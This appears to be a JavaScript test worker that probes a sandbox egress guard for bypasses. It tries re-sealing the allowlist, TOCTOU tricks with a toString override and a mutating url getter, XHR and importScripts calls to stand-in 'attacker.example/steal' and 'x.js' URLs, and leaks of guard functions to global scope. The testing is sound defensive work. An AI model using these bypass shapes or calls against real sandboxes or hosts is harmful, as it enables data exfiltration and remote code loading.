// Runs the REAL generated guard inside a real worker and probes it.
//
// The guard is a FRAGMENT that must be enclosed, exactly as buildWorkerSource
// encloses it in production: nothing may reach the worker's global scope. The
// test therefore evaluates guard + probes together in ONE function scope, which
// is also the only way the probes can reach the sealing function at all.
self.onmessage = async (event) => {
  const { guardSource, sealTo, probes, toctou } = event.data;
  const results = {};

  // Assembled so the guard's own bindings are local to this function, never
  // global. If a future change leaks one, the `globalReachable` probe below
  // catches it.
  const body = `
    ${guardSource}
    return (async () => {
      const out = {};
      ${sealTo ? `__seal(${JSON.stringify(sealTo)});` : ''}

      // Sealing must be one-shot: a second call must throw, not re-widen.
      try { __seal(['https://attacker.example/']); out.__reseal = 'ACCEPTED'; }
      catch (e) { out.__reseal = 'REFUSED'; }

      for (const [name, url] of Object.entries(${JSON.stringify(probes)})) {
        try { await self.fetch(url); out[name] = 'reached_network'; }
        catch (e) { out[name] = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'network_error_after_guard'; }
      }

      // Argument-shape confusion: an object whose .url is allowed but whose
      // string coercion is not. Checking .url and dispatching the object reads
      // one value through two algorithms; they must not be able to disagree.
      //
      // Which of the two a runtime picks is NOT the property under test, and
      // differs: the browser coerces via toString, Bun reads .url. The property
      // is that the URL the guard checked is the URL that is dispatched, so the
      // caller decides the verdict by watching what the server actually
      // received. Asserting 'denied' here instead would pass in one runtime and
      // fail in the other while proving nothing in either.
      const __t = ${JSON.stringify(toctou || null)};
      if (__t) {
        try {
          await self.fetch({ url: __t.url, toString() { return __t.evil; } });
          out.__toctou = 'REACHED';
        } catch (e) { out.__toctou = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'other:' + (e && e.message || e); }
      } else { out.__toctou = 'NOT_PROBED'; }

      // The SECOND shape, and the one that bites every runtime: a url getter
      // that answers differently on each read. Coercion disagreement needs the
      // runtime to prefer toString; a double read needs only that the guard
      // reads the property twice, once to check and once to dispatch. Both
      // reach the same wire, so both are watched by the server.
      if (__t) {
        let __n = 0;
        const __mutating = { get url() { return (__n++ === 0) ? __t.url : __t.evil; } };
        try {
          await self.fetch(__mutating);
          out.__toctouGetter = 'REACHED';
        } catch (e) { out.__toctouGetter = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'other:' + (e && e.message || e); }
      } else { out.__toctouGetter = 'NOT_PROBED'; }

      // XMLHttpRequest is a second, independent network path. Pyodide's
      // synchronous HTTP shims use it, so an unguarded XHR is not a corner case.
      if (typeof self.XMLHttpRequest === 'function') {
        try {
          const x = new self.XMLHttpRequest();
          x.open('GET', 'https://attacker.example/steal', true);
          out.__xhrDenied = 'REACHED';
        } catch (e) { out.__xhrDenied = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'other'; }
        try {
          const x2 = new self.XMLHttpRequest();
          x2.open('GET', ${JSON.stringify(probes.allowedDataPlane)}, true);
          out.__xhrAllowed = 'PASSED_GUARD';
        } catch (e) { out.__xhrAllowed = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'other'; }
      } else {
        out.__xhrDenied = 'NO_XHR_IN_ENV';
        out.__xhrAllowed = 'NO_XHR_IN_ENV';
      }

      // importScripts performs a real cross-origin GET outside fetch and XHR.
      if (typeof self.importScripts === 'function') {
        try { self.importScripts('https://attacker.example/x.js'); out.__importScripts = 'REACHED'; }
        catch (e) { out.__importScripts = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'other'; }
      } else { out.__importScripts = 'NO_IMPORTSCRIPTS_IN_ENV'; }

      for (const t of ['WebSocket', 'EventSource', 'Worker', 'SharedWorker']) {
        try { new self[t]('https://zarr.nemar.org/x'); out['__' + t] = 'CONSTRUCTED'; }
        catch (e) { out['__' + t] = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'other'; }
      }

      // Nothing the guard declares may be reachable from global scope. Top-level
      // function declarations in a classic worker become global properties,
      // which made the sealing function callable as self.__seal and defeated the
      // whole boundary in one line.
      out.__globalReachable = ['__seal', '__check', '__denied', '__egress', 'isUrlAllowed']
        .filter((n) => typeof self[n] !== 'undefined');

      return out;
    })();
  `;

  try {
    // eslint-disable-next-line no-new-func
    const results2 = await new Function(body)();
    self.postMessage({ results: Object.assign(results, results2) });
  } catch (err) {
    self.postMessage({ fatal: String((err && err.message) || err) });
  }
};
